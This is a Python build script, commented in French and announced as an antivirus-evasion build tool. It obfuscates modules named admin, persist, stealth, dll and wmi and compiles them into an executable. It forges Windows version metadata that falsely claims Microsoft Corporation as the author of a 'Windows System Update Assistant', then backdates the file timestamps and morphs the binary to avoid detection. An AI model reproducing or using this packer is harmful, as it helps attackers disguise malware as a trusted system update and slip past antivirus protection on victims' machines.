import os
import sys
import subprocess
import random
import time
import shutil
import argparse
import ast
from datetime import datetime, timedelta
from obfuscator import CodeObfuscator
from binary_morph import BinaryMorphing

def prepare_environment():
    """Préparer l'environnement pour la compilation."""
    print("[+] Préparation de l'environnement de compilation...")
    
    # Créer un dossier temporaire pour la compilation
    build_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "build_temp")
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)
    
    return build_dir

def obfuscate_files(source_files, build_dir):
    """Obfusquer les fichiers source et les copier dans le dossier de build."""
    print("[+] Obfuscation des fichiers sources...")
    
    obfuscated_files = []
    for source_file in source_files:
        if not os.path.exists(source_file):
            print(f"[-] Fichier source non trouvé: {source_file}")
            continue
            
        with open(source_file, 'r', encoding='utf-8') as f:
            code = f.read()
        
        try:
            # Obfusquer le code avec gestion d'erreurs
            print(f"[*] Obfuscation de {source_file}...")
            obfuscated_code = CodeObfuscator.full_obfuscation(code)
            
            # Vérifier que le code obfusqué est valide
            try:
                ast.parse(obfuscated_code)
            except SyntaxError as e:
                print(f"[!] Erreur de syntaxe après obfuscation de {source_file}: {e}")
                print(f"[*] Utilisation du code original pour {source_file}")
                obfuscated_code = code  # Utiliser le code original en cas d'erreur
        except Exception as e:
            print(f"[!] Erreur lors de l'obfuscation de {source_file}: {e}")
            obfuscated_code = code  # Utiliser le code original en cas d'erreur
        
        # Générer un nom de fichier pour la version obfusquée
        base_name = os.path.basename(source_file)
        target_file = os.path.join(build_dir, base_name)
        
        # Écrire le code obfusqué
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)
        
        obfuscated_files.append(target_file)
        print(f"[+] Fichier obfusqué: {target_file}")
    
    return obfuscated_files

def create_spec_file(main_file, build_dir, output_name):
    """Crée un fichier .spec personnalisé pour PyInstaller."""
    print("[+] Création du fichier .spec personnalisé...")
    
    # Corriger les chemins pour éviter les problèmes d'échappement Unicode
    main_file_path = main_file.replace('\\', '/')
    dir_path = os.path.dirname(os.path.abspath(main_file)).replace('\\', '/')
    icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "resources/system_update.ico").replace("\\", "/")
    version_file_path = os.path.join(build_dir, "file_version_info.txt").replace("\\", "/")
    
    spec_template = f"""# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    [r'{main_file_path}'],
    pathex=[r'{dir_path}'],
    binaries=[],
    datas=[],
    hiddenimports=['subprocess', 'random', 'platform', 'base64', 'zlib', 'admin', 'persist', 'crypto', 'wmi', 'dll', 'stealth', 'os', 'sys', 'shutil', 'tempfile', 'string', 'time', 'threading', 'datetime'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=r'{icon_path}',
    version=r'{version_file_path}',
)
"""
    
    # Créer le fichier de version pour Windows
    version_info = """
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10, 0, 19041, 264),
    prodvers=(10, 0, 19041, 264),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft Corporation'),
        StringStruct(u'FileDescription', u'Windows System Update Assistant'),
        StringStruct(u'FileVersion', u'10.0.19041.264'),
        StringStruct(u'InternalName', u'winsysupdate'),
        StringStruct(u'LegalCopyright', u'© Microsoft Corporation. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'WindowsUpdateService.exe'),
        StringStruct(u'ProductName', u'Windows System Update'),
        StringStruct(u'ProductVersion', u'10.0.19041.264')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
"""
    
    version_file_path_full = os.path.join(build_dir, "file_version_info.txt")
    with open(version_file_path_full, 'w', encoding='utf-8') as f:
        f.write(version_info)
    
    spec_file_path = os.path.join(build_dir, f"{os.path.splitext(os.path.basename(main_file))[0]}.spec")
    with open(spec_file_path, 'w', encoding='utf-8') as f:
        f.write(spec_template)
    
    return spec_file_path

def modify_timestamps(file_path):
    """Modifie les timestamps du fichier pour qu'ils correspondent à des valeurs légitimes."""
    try:
        # Générer des timestamps qui semblent légitimes (3-8 mois dans le passé)
        current_time = datetime.now()
        random_days = random.randint(90, 240)  # Entre 3 et 8 mois
        fake_time = current_time - timedelta(days=random_days)
        
        # Convertir en timestamp
        atime = mtime = int(fake_time.timestamp())
        
        # Appliquer les timestamps
        os.utime(file_path, (atime, mtime))
        print(f"[+] Timestamps modifiés pour {file_path} -> {fake_time.strftime('%Y-%m-%d')}")
        return True
    except Exception as e:
        print(f"[-] Erreur lors de la modification des timestamps: {e}")
        return False

def compile_with_pyinstaller(spec_file, build_dir):
    """Compile le code obfusqué avec PyInstaller en utilisant un fichier .spec personnalisé."""
    print("[+] Compilation avec PyInstaller...")

    work_dir = os.path.join(build_dir, "work")
    dist_dir = os.path.join(build_dir, "dist")
    os.makedirs(work_dir, exist_ok=True)
    os.makedirs(dist_dir, exist_ok=True)

    pyinstaller_options = [
        sys.executable, "-m", "PyInstaller",
        "--clean",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        spec_file
    ]

    try:
        result = subprocess.run(pyinstaller_options, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[-] Erreur PyInstaller:\n{result.stderr}")
            return False
        print("[+] Compilation terminée avec succès")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de la compilation: {e}")
        return False

def apply_post_compilation_techniques(executable_path):
    """Applique des techniques supplémentaires après la compilation."""
    if not os.path.exists(executable_path):
        print(f"[-] Exécutable non trouvé: {executable_path}")
        return False
    
    print("[+] Application des techniques post-compilation...")
    
    # 1. Modifier les timestamps
    modify_timestamps(executable_path)
    
    # 2. Appliquer les techniques de morphing binaire
    temp_output = executable_path + ".morph"
    success = BinaryMorphing.apply_all_techniques(executable_path, temp_output)
    
    if success:
        # Remplacer l'original par la version morphée
        os.remove(executable_path)
        os.rename(temp_output, executable_path)
        print("[+] Morphing binaire appliqué avec succès")
    else:
        print("[-] Échec du morphing binaire, utilisation du binaire original")
    
    return True

def find_executable(build_dir, output_name):
    """Recherche le fichier exécutable généré dans les sous-dossiers."""
    print("[+] Recherche de l'exécutable compilé...")
    
    # Rechercher d'abord dans le dossier de distribution standard
    dist_dir = os.path.join(build_dir, "dist")
    executable_path = os.path.join(dist_dir, output_name)
    
    if os.path.exists(executable_path):
        print(f"[+] Exécutable trouvé: {executable_path}")
        return executable_path
    
    # Si non trouvé, rechercher récursivement
    for root, dirs, files in os.walk(build_dir):
        for file in files:
            if file.endswith('.exe'):
                found_path = os.path.join(root, file)
                print(f"[+] Exécutable trouvé (recherche): {found_path}")
                return found_path
    
    print("[-] Aucun exécutable trouvé")
    return None

def main():
    """Fonction principale."""
    parser = argparse.ArgumentParser(description="Script de build furtif")
    parser.add_argument("--output", "-o", default="WindowsUpdateService.exe", help="Nom du fichier de sortie")
    args = parser.parse_args()
    
    print("\n=== BUILD SCRIPT AVANCÉ POUR ÉVASION AV ===")
    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 50)
    
    # Liste des fichiers à compiler
    source_files = [
        "main.py",
        "admin.py",
        "persist.py",
        "crypto.py", 
        "wmi.py",
        "dll.py",
        "stealth.py"
    ]
    
    # Préparer l'environnement
    build_dir = prepare_environment()
    
    # Obfusquer les fichiers
    obfuscated_files = obfuscate_files(source_files, build_dir)
    
    # Fichier principal pour la compilation
    main_file = [f for f in obfuscated_files if os.path.basename(f) == "main.py"][0]
    
    # Créer un fichier spec personnalisé
    spec_file = create_spec_file(main_file, build_dir, args.output)
    
    # Compiler avec PyInstaller
    success = compile_with_pyinstaller(spec_file, build_dir)
    
    if success:
        # Rechercher l'exécutable compilé
        executable_path = find_executable(build_dir, args.output)
        
        if executable_path:
            # Appliquer des techniques post-compilation
            apply_post_compilation_techniques(executable_path)
            
            # Copier l'exécutable final
            final_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), args.output)
            shutil.copy2(executable_path, final_exe)
            
            print(f"\n[+] Build terminé avec succès: {final_exe}")
        else:
            print("\n[-] Exécutable final non trouvé")
    else:
        print("\n[-] Build échoué")

if __name__ == "__main__":
    main()